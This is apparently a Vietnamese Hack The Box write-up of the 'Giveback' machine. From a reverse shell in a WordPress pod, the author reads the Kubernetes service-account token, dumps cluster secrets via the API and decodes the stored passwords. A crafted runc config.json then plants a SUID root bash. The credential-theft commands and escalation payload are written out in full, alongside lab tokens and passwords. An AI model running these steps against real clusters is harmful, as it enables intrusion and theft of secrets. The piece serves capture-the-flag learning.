Mình tìm kiếm docs và tìm ra [**access-api-from-pod**](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/) nơi mà mình có thể [**accessing-the-api-from-within-a-pod**](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#accessing-the-api-from-within-a-pod) nếu mình có: 

- token (JWT cho auth API)
- ca.crt (Certificate authority)
- namespace (Current namespace)

Thử tìm kiếm xem sao.

![image](/assets/images/HTB/season9/Giveback/image%2044.png)

> Theo document thì mỗi pod có service account được mount tại **`/var/run/secrets/kubernetes.io/serviceaccount`**
> 

```bash
**┌──(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ penelope -p 6666
[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 192.168.116.130 • 172.18.0.1 • 172.17.0.1 • 10.10.16.72
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-gb975~10.10.11.94-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.16.72:6666
[-] Failed spawning new session
[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/sessions/legacy-intranet-cms-6f7bf5db84-gb975~10.10.11.94-Linux-x86_64/2025_12_09-17_46_10-390.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-gb975~10.10.11.94-Linux-x86_64 😍️ Assigned SessionID <2>
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk2ODEwNjc5LCJpYXQiOjE3NjUyNzQ2NzksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZWU2MjlkNWYtYWYzYi00OGZkLTlhYjgtZDIxYzhlMmIzNjdiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWdiOTc1IiwidWlkIjoiMDc5NDAzMjMtNjMyYi00NDA5LTkxMWItYzJmZmExZmJkY2E5In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2NTI3ODI4Nn0sIm5iZiI6MTc2NTI3NDY3OSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.Q7wQgVVXofZXzEKzA6xJLzQwRY_01ldkd-Ua8JhHb6pv1advcCx6lTHy-L_2_SdWGk5CcKqKmkXD9cHWISDxFCYApGEEgyGuvFgaiAdwU4HyOwC2UIvsDUExQrnzwibqQbjyk1QxHSNP72-SjT7gLNYqMAHR1ry_sbmptmKaUdOZLQ47vhkO6tMtytRjiBingji_BBqY1G8ok6Hm5oAysTUTbKk8twQnHYkSKcuRqZTVBUVq5vFTtGAUBJpLYfLKj3IcthGlFOGuHTSzkK_HFXY4VzxSZqRvXA1wOKsf3W4rBW6ms57z5YVdzUCOoEkrR_8aQL_fa55eQKD7DJ0N8A
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
-----END CERTIFICATE-----**
```

Để dễ dùng hơn thì mình đọc **`ca.crt`** theo dạng base64. 

```bash
**cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | base64 -w0
LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTWpZNU1qYzNNak13SGhjTk1qUXdPVEl4TVRRd09EUXpXaGNOTXpRd09URTVNVFF3T0RRegpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTWpZNU1qYzNNak13V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUV1lXT25JVW1EbjhER0hPZEtManJPWjM2Z1NVTVZybnFxZjZZSnN2cGsKOVFiZ3pHTkZ6WWN3RFp4bVp0SmF5VGJVckZGamdTeWRETkd1Vy9Ba0VuUStvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXRDcFZEYkszWG5CdjNOM0JLdVh5CllkMHplaWN3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnT3NGbzRVaXBlWFBpRVh2bEdIMDZmamE4azQ2eXRCNDUKY2QwZDM5dVNodVFDSVFETWdhU1c4bnJwTWZORXh1R0xNWmhjc1ZyVXI1WFhOOEY1Yi96WWk1c25rUT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K**
```

Mình có thể dùng [**secrets**](https://kubernetes.io/docs/concepts/configuration/secret/) này để thu thập thông tin.

```bash
**TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

ccurl -sk -H "Authorizartion: Bearer $TOKEN" https://10.43.0.1:443/api/v1/namespaces/default/secrets**
```

Mình thu được.,

```bash
**{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2867450"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "beta-vino-wp-wordpress",
        "namespace": "default",
        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
        "resourceVersion": "2088228",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "wordpress",
          "app.kubernetes.io/version": "6.8.2",
          "helm.sh/chart": "wordpress-25.0.5"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:wordpress-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "wordpress-password": "TzhGN0tSNXpHaQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v58",
        "namespace": "default",
        "uid": "13034cd4-64e1-4e2e-9182-4ce0ffda27e8",
        "resourceVersion": "2123405",
        "creationTimestamp": "2025-08-30T05:17:49Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "58"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T05:21:45Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      }**
```

Kết quả cúi thì mình thu thêm được 1 user nữa là **`user-secret-babywyrm`** 

```bash
**"type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "29a465d9-dd1a-4816-b1d4-dd6ef50a30cd",
        "resourceVersion": "2857813",
        "creationTimestamp": "2025-12-09T10:05:10Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "2e45c392-eede-4cc8-9d0b-0098fde2b67f",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-12-09T10:05:10Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"2e45c392-eede-4cc8-9d0b-0098fde2b67f\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "eERtdk5VRU04a2pabDc2Y0tNU1dpTXVkbHlkRjQ5Rlc="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-margotrobbie",
        "namespace": "default",
        "uid": "ff2927c7-f02b-4482-81cc-ba3e35980d0b",
        "resourceVersion": "2857842",
        "creationTimestamp": "2025-12-09T10:05:12Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-margotrobbie",
            "uid": "f2ae6760-2239-4a18-a752-3519658f3bf2",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-12-09T10:05:12Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"f2ae6760-2239-4a18-a752-3519658f3bf2\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "RDU3VUd4aHFpZFp6Wmc4UG9yVlZ5N1hqMFhFNE1rNg=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-sydneysweeney",
        "namespace": "default",
        "uid": "bc556d29-8f68-4a55-b7b8-2d0676e539ff",
        "resourceVersion": "2857832",
        "creationTimestamp": "2025-12-09T10:05:11Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-sydneysweeney",
            "uid": "70409702-5022-4692-aa64-f51928f44a06",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-12-09T10:05:11Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"70409702-5022-4692-aa64-f51928f44a06\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "a1JhUkV1VkJNcTdQdVJDWHhGNWZJM3ZFaWZuNmZuRGw="
      },
      "type": "Opaque"
    }
  ]
}{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2867450"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "beta-vino-wp-wordpress",
        "namespace": "default",
        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
        "resourceVersion": "2088228",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "wordpress",
          "app.kubernetes.io/version": "6.8.2",
          "helm.sh/chart": "wordpress-25.0.5"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:wordpress-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "wordpress-password": "TzhGN0tSNXpHaQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v58",
        "namespace": "default",
        "uid": "13034cd4-64e1-4e2e-9182-4ce0ffda27e8",
        "resourceVersion": "2123405",
        "creationTimestamp": "2025-08-30T05:17:49Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "58"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T05:21:45Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      }**

```

Mình thử gọi tới với user này. 

```bash
**TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/namespaces/default/secrets/user-secret-babywyrm
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "user-secret-babywyrm",
    "namespace": "default",
    "uid": "29a465d9-dd1a-4816-b1d4-dd6ef50a30cd",
    "resourceVersion": "2857813",
    "creationTimestamp": "2025-12-09T10:05:10Z",
    "ownerReferences": [
      {
        "apiVersion": "bitnami.com/v1alpha1",
        "kind": "SealedSecret",
        "name": "user-secret-babywyrm",
        "uid": "2e45c392-eede-4cc8-9d0b-0098fde2b67f",
        "controller": true
      }
    ],
    "managedFields": [
      {
        "manager": "controller",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-12-09T10:05:10Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:MASTERPASS": {}
          },
          "f:metadata": {
            "f:ownerReferences": {
              ".": {},
              "k:{\"uid\":\"2e45c392-eede-4cc8-9d0b-0098fde2b67f\"}": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "MASTERPASS": "eERtdk5VRU04a2pabDc2Y0tNU1dpTXVkbHlkRjQ5Rlc="
  },
  "type": "Opaque"
}**
```

Mình có được 1 masterpass nhưng mà nó bị encode base64. Nên là mình decode nó. 

![image](/assets/images/HTB/season9/Giveback/image%2045.png)

Từ đây mình vào ssh như đã scan port lúc trên

![image](/assets/images/HTB/season9/Giveback/image%2046.png)

Từ đây mình khám phá trên user này.

![image](/assets/images/HTB/season9/Giveback/image%2047.png)

## Inital Access

---

Mình đã có được user vào bằng ssh là **`babywyrm`** xem thử nó có thể nâng quyền lên hay ko.

### Discovery

![image](/assets/images/HTB/season9/Giveback/image%2048.png)

Thấy **`/opt/debug`** chạy được → nên chạy thử.

![image](/assets/images/HTB/season9/Giveback/image%2049.png)

Nhưng nó bắt mình phải nhập thêm pass của **`administrative`** 

Ở trên thì thấy có password của db là **`mariadb-password`** , khi mình check **`https://10.43.0.1:443/api/v1/namespaces/default/secrets`** 

```bash
**"data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },**
```

Nhưng mà trước khi tìm ra CVEs ở trên thì mình cũn tìm ra password của DB mà web wordpress đang dùng. 

```bash
**define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );**
```

![image](/assets/images/HTB/season9/Giveback/image%2050.png)

Giờ thì mình chạy lại. 

```bash
**babywyrm@giveback:~$ sudo  /opt/debug
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version**
```

Runc giồng như container-runtime chứa cấp thấp và cũng triển khai OCI (Open Container Initiative) và đặc tả này được Docker, contianerd và Kubernetes.

→ đọc thử file config.

![image](/assets/images/HTB/season9/Giveback/image%2051.png)

```bash
**babywyrm@giveback:~$ cat config.json
{
        "ociVersion": "1.2.1",
        "process": {
                "terminal": true,
                "user": {
                        "uid": 0,
                        "gid": 0
                },
                "args": [
                        "sh"
                ],
                "env": [
                        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                        "TERM=xterm"
                ],
                "cwd": "/",
                "capabilities": {
                        "bounding": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ],
                        "effective": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ],
                        "permitted": [
                                "CAP_AUDIT_WRITE",
                                "CAP_KILL",
                                "CAP_NET_BIND_SERVICE"
                        ]
                },
                "rlimits": [
                        {
                                "type": "RLIMIT_NOFILE",
                                "hard": 1024,
                                "soft": 1024
                        }
                ],
                "noNewPrivileges": true
        },
        "root": {
                "path": "rootfs",
                "readonly": true
        },
        "hostname": "runc",
        "mounts": [
                {
                        "destination": "/proc",
                        "type": "proc",
                        "source": "proc"
                },
                {
                        "destination": "/dev",
                        "type": "tmpfs",
                        "source": "tmpfs",
                        "options": [
                                "nosuid",
                                "strictatime",
                                "mode=755",
                                "size=65536k"
                        ]
                },
                {
                        "destination": "/dev/pts",
                        "type": "devpts",
                        "source": "devpts",
                        "options": [
                                "nosuid",
                                "noexec",
                                "newinstance",
                                "ptmxmode=0666",
                                "mode=0620",
                                "gid=5"
                        ]
                },
                {
                        "destination": "/dev/shm",
                        "type": "tmpfs",
                        "source": "shm",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "mode=1777",
                                "size=65536k"
                        ]
                },
                {
                        "destination": "/dev/mqueue",
                        "type": "mqueue",
                        "source": "mqueue",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev"
                        ]
                },
                {
                        "destination": "/sys",
                        "type": "sysfs",
                        "source": "sysfs",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "ro"
                        ]
                },
                {
                        "destination": "/sys/fs/cgroup",
                        "type": "cgroup",
                        "source": "cgroup",
                        "options": [
                                "nosuid",
                                "noexec",
                                "nodev",
                                "relatime",
                                "ro"
                        ]
                }
        ],
        "linux": {
                "resources": {
                        "devices": [
                                {
                                        "allow": false,
                                        "access": "rwm"
                                }
                        ]
                },
                "namespaces": [
                        {
                                "type": "pid"
                        },
                        {
                                "type": "network"
                        },
                        {
                                "type": "ipc"
                        },
                        {
                                "type": "uts"
                        },
                        {
                                "type": "mount"
                        },
                        {
                                "type": "cgroup"
                        }
                ],
                "maskedPaths": [
                        "/proc/acpi",
                        "/proc/asound",
                        "/proc/kcore",
                        "/proc/keys",
                        "/proc/latency_stats",
                        "/proc/timer_list",
                        "/proc/timer_stats",
                        "/proc/sched_debug",
                        "/sys/firmware",
                        "/proc/scsi"
                ],
                "readonlyPaths": [
                        "/proc/bus",
                        "/proc/fs",
                        "/proc/irq",
                        "/proc/sys",
                        "/proc/sysrq-trigger"
                ]
        }
}babywyrm@giveback:~$** 
```

Những thứ này sẽ giúp mình leo lên root. 

## Privilege Escalation

---

Mình sẽ sửa đổi **`config.json`** và cho chạy nó bằng **`root`**, gắn với **`/root`** vào vùng chứa sau đó mình tạo file nhị phân suid.

### runc

```bash
**babywyrm@giveback:~$ mkdir -p root/rootfs
babywyrm@giveback:~$ cd root/
babywyrm@giveback:~/root$ cat > config.json << 'EOF'
> {
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh", "-c", "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"],
    "cwd": "/",
    "env": ["PATH=/bin:/usr/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/tmp", "type": "bind", "source": "/tmp", "options": ["bind","rw"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}
> EOF**
```

Giờ mình thì chạy **`sudo /opt/debug`** 1 lần nữa trong **`/root`** nó sẽ kích hoạt suid và mình sẽ leo lên root.

![image](/assets/images/HTB/season9/Giveback/image%2052.png)

![image](/assets/images/HTB/season9/Giveback/image%2053.png)

![image](/assets/images/HTB/season9/Giveback/image%2054.png)